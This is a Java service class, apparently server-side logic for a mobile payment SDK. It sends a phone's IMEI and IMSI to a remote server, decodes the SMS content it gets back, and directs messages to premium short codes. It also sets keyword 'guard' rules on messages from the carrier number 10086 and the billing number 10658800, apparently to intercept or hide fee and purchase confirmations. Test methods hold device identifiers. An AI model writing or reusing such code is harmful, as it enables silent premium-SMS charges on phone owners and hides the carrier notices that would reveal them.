package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.log4j.Logger;
import org.json.JSONException;
import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sets;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.StringUtils;

import sun.misc.BASE64Decoder;

public class ZztDwyDynamicService implements IDynamicService{

	private static Logger logger = Logger.getLogger(ZztDwyDynamicService.class);
	
	private static final String TYPE = "zztDwy";
	
	private static final String FIRSTPARAM = "imei={imei}&imsi={imsi}&param={cid}{orderId}&bid={bid}&cid={cpid}";
	
	private static final String SECONDPARAM = "sid={sid}";
	
	private static int LENGTH = 7;

	private static final String THENO_1 = "1";
	private static final String THENO_2 = "2";
	
	private static final String DEST_1 = "10658422";
	private static final String DEST_2 = "1065889923";
	
	private static final String STATUS_WAIT = "1001";
	private static final String STATUS_SUCC = "0";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 10;
	
	private static final Guard guard1 = new Guard("10658800", "无法|有误|请核对", 2880, "-1", 0);
	private static final Guard guard2 = new Guard("10658800","处理|等候",2880,"0",0);
	private static final Guard guard6 = new Guard("10658800","成功|购买",2880,"1",0);
	private static final Guard guard3 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard4 = new Guard("10658800","",960,null,1);
	private static final Guard guard5 = new Guard("10086","",960,null,1);
	
	private int timeOut = 60;
	
	private Map<String, Integer> map1 = new HashMap<String, Integer>();
	//记录重复请求
	private Map<String, Long> tryMap = new HashMap<String, Long>();
		
	@Override
	public String getType() {
		return TYPE;
	}

	@Override
	public String dynamic(Map<String, String> map) {
		
		String theNo = map.get("theNo");
		
		if(THENO_1.equals(theNo)){
			return firstDynamic(map);
		}else if(THENO_2.equals(theNo)){
			return secondDynamic(map);
		}
		
		return null;
	}
	
	private String firstDynamic(Map<String, String> map){
		String url = map.get("url");
		String xml = null;
		
		if(url != null && url.length() > 0){
			String imsi = StringUtils.defaultString(map.get("imsi"));
			String imei = StringUtils.defaultString(map.get("imei"));
			
			String cid = StringUtils.defaultString(map.get("cid"));
			String bid = StringUtils.defaultString(map.get("bid"));
			String cpid = StringUtils.defaultString(map.get("cpid"));

			String orderId = "";
			
			String channel = StringUtils.defaultString(map.get("channel"));
			
			if(channel != null && channel.length() >= LENGTH){
				orderId = channel.substring(channel.length() - 7,channel.length());
			}else{
				orderId = StringUtils.getRandom(LENGTH);
			}
			
			String requestParam = FIRSTPARAM.replace("{imsi}", imsi);
			requestParam = requestParam.replace("{imei}",imei);
			requestParam = requestParam.replace("{cid}", cid);
			requestParam = requestParam.replace("{orderId}",orderId);
			requestParam = requestParam.replace("{bid}",bid);
			requestParam = requestParam.replace("{cpid}",cpid);
			
			String responseJson = GetData.getData(url, requestParam);
			
			xml = parseFirst(responseJson);
		}
		
		String cpparam = map.get("channel");
		
		if(xml == null){
			Integer cnt = map1.get(cpparam);
			
			if(cnt == null){
				cnt = 0;
			}
			
			if(cnt >= 3){
				map1.remove(cpparam);
				xml = DynamicUtils.parseError("598");
			}else{
				cnt ++;
				map1.put(cpparam, cnt);
				
				xml = DynamicUtils.parseWait(10,map);//获取失败
			}
		}else{
			map1.remove(cpparam);
		}
		
		return xml;
	}
	
	private String parseFirst(String responseJson){
		
		if(responseJson != null && responseJson.length() > 0){
			try {
				JSONObject jo = new JSONObject(responseJson);
				
				String resultCode = jo.getString("resultCode");
				
				if("0".equals(resultCode)){
					String sid = StringUtils.defaultString(jo.getString("sid"));
					String regSms = StringUtils.defaultString(jo.getString("regSms"));
					
					if(sid.length() > 0 && regSms.length() > 0){
						String smsContent = CommonUtil.base64Decode(regSms);
						
						Sms sms = new Sms();
						sms.setSmsDest(DEST_1);
						sms.setSmsContent(smsContent);
						sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
						
						StringBuffer smsBuffer = XstreamHelper.toXml(sms);
						
						Sets sets = new Sets();
						sets.setKey("sid");
						sets.setValue(sid);
						
						StringBuffer setsBuffer = XstreamHelper.toXml(sets);
						
						//发两次，为了提高送达率
						setsBuffer.append(smsBuffer);
						
						return setsBuffer.toString();
					}
				}
				
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		
		return null;
	}
	
	private String secondDynamic(Map<String, String> map){
		
		String xml = null;
		String url = map.get("url");
		
		String sid = map.get("sid");
		
		if(url != null && url.length() > 0){
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(sid);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(sid,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(sid);
					return DynamicUtils.parseError("599");
				}
			}
			
			String requestParam = SECONDPARAM.replace("{sid}", sid);
			
			logger.info("secondDynamic : "+requestParam);
			
			String responseJson =  GetData.getData(url,requestParam);
		
			xml = parseSecond(map,responseJson);
		}
		
		if(xml == null){
			xml = DynamicUtils.parseWait(10,map);//获取失败
		}
		
		return xml;
	}

	private String parseSecond(Map<String,String> map,String responseJson){
		
		logger.info("parse second : "+responseJson);
		
		if(responseJson != null && responseJson.length() > 0){
			JSONObject jo = null;
			try {
				jo = new JSONObject(responseJson);
			
				String status = jo.getString("resultCode");
				
				if(STATUS_WAIT.equals(status)){//等待
					return DynamicUtils.parseWait(7,map);
				}else{ 
					tryMap.remove(map.get("sid"));
					
					if(STATUS_SUCC.equals(status)){//完成
						return parseSecondSucc(map,jo);
					}
				}
			} catch (JSONException e) {
				e.printStackTrace();
			}
		}
		
		return null;
	}
	
	private String parseSecondSucc(Map<String,String> map,JSONObject jo){
		
		try{
			String chargeSms = jo.getString("chargeSms");
			
			chargeSms = CommonUtil.base64Decode(chargeSms);
			
			
			List<Sms> smsList = new ArrayList<Sms>();
			
			Sms sms = new Sms();
			
			sms.setSmsContent(chargeSms);
			sms.setSmsDest(DEST_2);
			sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
			
			smsList.add(sms);
			
			Sms guardSms = new Sms();
			
			List<Guard> guardList = new ArrayList<Guard>();
			
			guardList.add(guard1);
			guardList.add(guard2);
			
			guardList.add(guard6);
			guardList.add(guard3);
			guardList.add(guard4);
			guardList.add(guard5);
			
			guardSms.setGuardList(guardList);
			
			smsList.add(0, guardSms);

			return XstreamHelper.toXml(smsList);
		}catch(Exception e){
			e.printStackTrace();
		}
		
		return null;
	}
	
	public static void main(String[] args){
		test1();
		
//		test2();
		
		
		
		
	}
	
	private static void test1(){
		Map<String, String> map = new HashMap<String, String>();
		map.put("imsi", "460001153105779");
		map.put("imei", "869460011612203");
		map.put("cid", "151");
		map.put("channel", "106101a000327138");
		map.put("bid","000072977001");
		map.put("cpid","1136");
		map.put("url","http://221.179.176.138:81/dwyreg.php");
		map.put("theNo", "1");
		
		System.out.println(new ZztDwyDynamicService().dynamic(map));
	
	}
	
	private static void test2(){
		Map<String, String> map = new HashMap<String, String>();
		map.put("sid","MTgyLjkyLjEwMC4yMzMtMTQxNDU3OTg3NDI4MQ==");
		map.put("url","http://221.179.176.138:81/dwyfee.php");
		map.put("theNo", "2");
		
		System.out.println(new ZztDwyDynamicService().dynamic(map));
	}
}
